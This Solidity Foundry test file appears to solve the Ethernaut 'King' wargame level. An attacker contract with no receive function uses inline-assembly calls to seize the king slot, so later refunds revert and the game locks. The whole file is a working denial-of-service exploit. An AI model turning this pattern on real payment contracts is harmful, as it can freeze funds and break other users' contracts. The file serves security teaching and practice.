pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/King.sol";

contract AttackKing {
    function forward(address _to) external payable {
        assembly {
            let __ := call(gas(), _to, callvalue(), 0, 0, 0, 0)
        }
    }
    // no receive function defined
}

contract ASMKing is Test {
    address public attacker = address(420);
    address payable public target;

    AttackKing fwd;

    function setUp() public {
        vm.deal(address(this), 0.001 ether);
        vm.deal(attacker, 1 ether);
        King king = new King{value: 0.001 ether}();
        target = payable(address(king));
        fwd = new AttackKing();
    }

    modifier attack() {
        vm.startPrank(attacker);
        _;
        vm.stopPrank();
    }

    function _attackKing() internal attack {
        assembly {
            // let fmp
            let ptr := mload(0x40)

            // load selector
            mstore(ptr, shl(0xe0, 0x101e8952)) // forward(address)
            ptr := add(0x4, ptr)
            let data := 0x4

            // load address
            mstore(ptr, sload(target.slot))
            ptr := add(0x20, ptr)
            data := add(0x20, data)

            // Call the "forward" function
            let success :=
                call(
                    gas(),
                    sload(fwd.slot),
                    1000000000000001, // 0.001 ether + 1 wei
                    sub(ptr, data),
                    data,
                    0,
                    0
                )
            if eq(success, 0) { revert(0, 0) }
        }
    }

    function testAttackKing() public {
        _attackKing();
        (bool result,) = target.call{value: 0}("");

        assertEq(result, false); // should revert
        assertNotEq(King(target)._king(), address(this));
    }

    receive() external payable {}
}
